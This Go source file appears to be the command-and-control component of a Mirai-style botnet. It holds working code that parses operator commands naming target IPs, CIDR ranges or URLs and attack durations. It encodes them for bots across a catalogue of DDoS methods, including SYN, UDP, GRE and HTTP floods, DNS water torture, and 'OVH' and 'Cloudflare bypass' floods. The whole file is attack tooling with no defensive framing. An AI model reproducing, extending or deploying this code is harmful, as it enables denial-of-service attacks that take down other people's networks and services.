package main

import (
	"encoding/binary"
	"errors"
	"net"
	"strconv"
	"strings"

	"github.com/mattn/go-shellwords"
)

type AttackInfo struct {
	attackID          uint8
	attackFlags       []uint8
	attackDescription string
}

type Attack struct {
	Duration uint32
	Type     uint8
	Targets  map[uint32]uint8
	Flags    map[uint8]string
}

type FlagInfo struct {
	flagID          uint8
	flagDescription string
}

var flagInfoLookup map[string]FlagInfo = map[string]FlagInfo{
	"len":      FlagInfo{0, "Size of packet data, default is 512 bytes"},
	"rand":     FlagInfo{1, "Randomize packet data content, default is 1 (yes)"},
	"tos":      FlagInfo{2, "TOS field value in IP header, default is 0"},
	"ident":    FlagInfo{3, "ID field value in IP header, default is random"},
	"ttl":      FlagInfo{4, "TTL field value in IP header, default is 255"},
	"df":       FlagInfo{5, "Set the Dont-Fragment bit in IP header, default is 0"},
	"sport":    FlagInfo{6, "Source port, default is random"},
	"dport":    FlagInfo{7, "Destination port, default is random"},
	"domain":   FlagInfo{8, "Domain name to attack"},
	"dhid":     FlagInfo{9, "Domain name transaction ID, default is random"},
	"urg":      FlagInfo{11, "Set the URG bit in IP header, default is 0"},
	"ack":      FlagInfo{12, "Set the ACK bit in IP header, default is 0"},
	"psh":      FlagInfo{13, "Set the PSH bit in IP header, default is 0"},
	"rst":      FlagInfo{14, "Set the RST bit in IP header, default is 0"},
	"syn":      FlagInfo{15, "Set the SYN bit in IP header, default is 0"},
	"fin":      FlagInfo{16, "Set the FIN bit in IP header, default is 0"},
	"seqnum":   FlagInfo{17, "Sequence number value in TCP header, default is random"},
	"acknum":   FlagInfo{18, "Ack number value in TCP header, default is random"},
	"gcip":     FlagInfo{19, "Set internal IP to destination ip, default is 0"},
	"method":   FlagInfo{20, "HTTP method name, default is get"},
	"postdata": FlagInfo{21, "POST data, default is empty/none"},
	"path":     FlagInfo{22, "HTTP path, default is /"},
	"conns":    FlagInfo{24, "Number of connections"},
	"source":   FlagInfo{25, "Source IP address, 255.255.255.255 for random"},
	"minlen":   FlagInfo{26, "min len"},
	"maxlen":   FlagInfo{27, "max len"},
	"payload":  FlagInfo{28, "custom payload"},
	"repeat":   FlagInfo{29, "number of times to repeat"},
	"url":      FlagInfo{30, "Full HTTP/HTTPS URL (e.g., http://example.com/path)"},
	"https":    FlagInfo{31, "Use HTTPS/SSL (0 or 1)"},
	"size":     FlagInfo{0, "Size of packet data (alias for len)"},
	"port":     FlagInfo{7, "Destination port (alias for dport)"},
}

/*
 * Attack method IDs - Streamlined to remove duplicates
 * Must match bot/attack.h ATK_VEC_* values
 */
var attackInfoLookup map[string]AttackInfo = map[string]AttackInfo{
	/* UDP Floods (0-7) - Core methods only */
	"udp":        AttackInfo{0, []uint8{0, 1, 6, 7, 25}, "Standard UDP flood"},
	"udpplain":   AttackInfo{1, []uint8{0, 1, 7}, "UDP plain flood"},
	"udphex":     AttackInfo{2, []uint8{0, 7}, "UDP HEX flood"},
	"socket-raw": AttackInfo{3, []uint8{0, 2, 3, 4, 5, 6, 7, 25}, "Raw socket UDP flood"},
	"samp":       AttackInfo{4, []uint8{7}, "SAMP game UDP flood"},
	"ovhudp":     AttackInfo{5, []uint8{0, 1, 7}, "OVH UDP bypass"},
	"dns":        AttackInfo{6, []uint8{7, 8, 9}, "DNS water torture"},
	"vse":        AttackInfo{7, []uint8{7}, "Valve Source Engine flood"},

	/* TCP Floods (20-27) - Core methods only */
	"tcp":       AttackInfo{20, []uint8{0, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25}, "Raw TCP flood"},
	"syn":       AttackInfo{21, []uint8{0, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25}, "SYN flood"},
	"ack":       AttackInfo{22, []uint8{0, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25}, "ACK flood"},
	"tcpfrag":   AttackInfo{23, []uint8{0, 2, 3, 4, 5, 6, 7}, "TCP fragment flood"},
	"tcpbypass": AttackInfo{24, []uint8{0, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25}, "TCP bypass flood"},
	"xmas":      AttackInfo{25, []uint8{0, 2, 3, 4, 5, 6, 7}, "XMAS TCP flood"},
	"greip":     AttackInfo{26, []uint8{0, 1, 2, 3, 4, 5, 6, 7, 19, 25}, "GRE IP flood"},
	"mixed":     AttackInfo{27, []uint8{0, 1, 2, 3, 4, 5, 6, 7, 11, 12, 13, 14, 15, 16, 17, 18, 25}, "Mixed TCP+UDP"},

	/* Special Attacks (40-42) */
	"homeslam":  AttackInfo{40, []uint8{4}, "ICMP ping flood"},
	"udpbypass": AttackInfo{41, []uint8{0, 1, 6, 7, 25}, "UDP bypass flood"},
	"greeth":    AttackInfo{42, []uint8{0, 1, 2, 3, 4, 5, 6, 7, 19, 25}, "GRE Ethernet flood"},

	/* HTTP/HTTPS (50-52) */
	"http":      AttackInfo{50, []uint8{7, 8, 20, 21, 22, 24, 30}, "HTTP flood"},
	"https":     AttackInfo{51, []uint8{7, 8, 20, 21, 22, 24, 30}, "HTTPS flood"},
	"browserem": AttackInfo{52, []uint8{7, 8, 20, 22, 24, 30}, "Browser emulation"},

	/* Cloudflare (60) */
	"cf": AttackInfo{60, []uint8{7, 8, 20, 21, 22, 24}, "Cloudflare bypass"},
}

func uint8InSlice(a uint8, list []uint8) bool {
	for _, b := range list {
		if b == a {
			return true
		}
	}
	return false
}

func NewAttack(str string, admin int) (*Attack, error) {
	atk := &Attack{0, 0, make(map[uint32]uint8), make(map[uint8]string)}
	args, err := shellwords.Parse(str)
	if err != nil {
		return nil, errors.New("Failed to parse attack command")
	}

	if len(args) < 3 {
		return nil, errors.New("Invalid attack command (need method, target, duration)")
	}

	// Parse attack method
	if atkInfo, ok := attackInfoLookup[args[0]]; !ok {
		return nil, errors.New("Unknown attack method: " + args[0])
	} else {
		atk.Type = atkInfo.attackID
	}

	// Check if this is an HTTP/HTTPS attack (types 50-52, 60)
	isHTTPAttack := (atk.Type >= 50 && atk.Type <= 52) || atk.Type == 60

	if isHTTPAttack {
		targetURL := args[1]
		
		if strings.HasPrefix(targetURL, "http://") || strings.HasPrefix(targetURL, "https://") {
			domain := extractDomainFromURL(targetURL)
			if domain != "" {
				atk.Flags[8] = domain
			}
			
			path := extractPathFromURL(targetURL)
			if path != "" && atk.Flags[22] == "" {
				atk.Flags[22] = path
			}
			
			if strings.HasPrefix(targetURL, "https://") {
				atk.Flags[31] = "1"
			}
		} else {
			atk.Flags[8] = targetURL
		}
		
		domainOrIP := extractDomainFromURL(args[1])
		if domainOrIP == "" {
			domainOrIP = args[1]
		}
		if ip := net.ParseIP(domainOrIP); ip != nil && ip.To4() != nil {
			atk.Targets[binary.BigEndian.Uint32(ip.To4())] = 32
		} else if domainOrIP != "" {
			if ips, err := net.LookupIP(domainOrIP); err == nil {
				for _, resolvedIP := range ips {
					if ipv4 := resolvedIP.To4(); ipv4 != nil {
						atk.Targets[binary.BigEndian.Uint32(ipv4)] = 32
						break
					}
				}
			}
		}
	} else {
		for i := 1; i < len(args)-1; i++ {
			if strings.Contains(args[i], "/") {
				ip, prefix, err := net.ParseCIDR(args[i])
				if err != nil {
					return nil, errors.New("Invalid CIDR: " + args[i])
				}
				ip = ip.To4()
				if ip == nil {
					return nil, errors.New("Invalid IPv4 address")
				}
				prefixLen, _ := prefix.Mask.Size()
				atk.Targets[binary.BigEndian.Uint32(ip)] = uint8(prefixLen)
			} else {
				ip := net.ParseIP(args[i])
				if ip == nil {
					return nil, errors.New("Invalid IP address: " + args[i])
				}
				ip = ip.To4()
				if ip == nil {
					return nil, errors.New("Invalid IPv4 address")
				}
				atk.Targets[binary.BigEndian.Uint32(ip)] = 32
			}
		}
	}

	duration, err := strconv.Atoi(args[len(args)-1])
	if err != nil {
		return nil, errors.New("Invalid duration: " + args[len(args)-1])
	}
	if duration > 3600 || duration < 1 {
		return nil, errors.New("Duration must be between 1 and 3600 seconds")
	}
	atk.Duration = uint32(duration)

	for i := 1; i < len(args)-1; i++ {
		if strings.Contains(args[i], "=") {
			parts := strings.SplitN(args[i], "=", 2)
			key := strings.ToLower(parts[0])
			value := parts[1]

			if flagInfo, ok := flagInfoLookup[key]; ok {
				if !uint8InSlice(flagInfo.flagID, attackInfoLookup[args[0]].attackFlags) {
					return nil, errors.New("Flag '" + key + "' not allowed for this attack")
				}
				atk.Flags[flagInfo.flagID] = value
			}
		}
	}

	return atk, nil
}

func extractDomainFromURL(urlStr string) string {
	urlStr = strings.TrimPrefix(urlStr, "http://")
	urlStr = strings.TrimPrefix(urlStr, "https://")
	
	if idx := strings.Index(urlStr, "/"); idx != -1 {
		urlStr = urlStr[:idx]
	}
	
	if idx := strings.Index(urlStr, ":"); idx != -1 {
		urlStr = urlStr[:idx]
	}
	
	return urlStr
}

func extractPathFromURL(urlStr string) string {
	urlStr = strings.TrimPrefix(urlStr, "http://")
	urlStr = strings.TrimPrefix(urlStr, "https://")
	
	if idx := strings.Index(urlStr, "/"); idx != -1 {
		return urlStr[idx:]
	}
	
	return "/"
}

func (this *Attack) Build() ([]byte, error) {
	buf := make([]byte, 0)

	buf = append(buf, byte(this.Duration>>24), byte(this.Duration>>16), byte(this.Duration>>8), byte(this.Duration))
	buf = append(buf, byte(this.Type))
	buf = append(buf, byte(len(this.Targets)))

	for prefix, netmask := range this.Targets {
		buf = append(buf, byte(prefix>>24), byte(prefix>>16), byte(prefix>>8), byte(prefix))
		buf = append(buf, byte(netmask))
	}

	buf = append(buf, byte(len(this.Flags)))

	for key, value := range this.Flags {
		buf = append(buf, byte(key))
		buf = append(buf, byte(len(value)))
		buf = append(buf, []byte(value)...)
	}

	return buf, nil
}
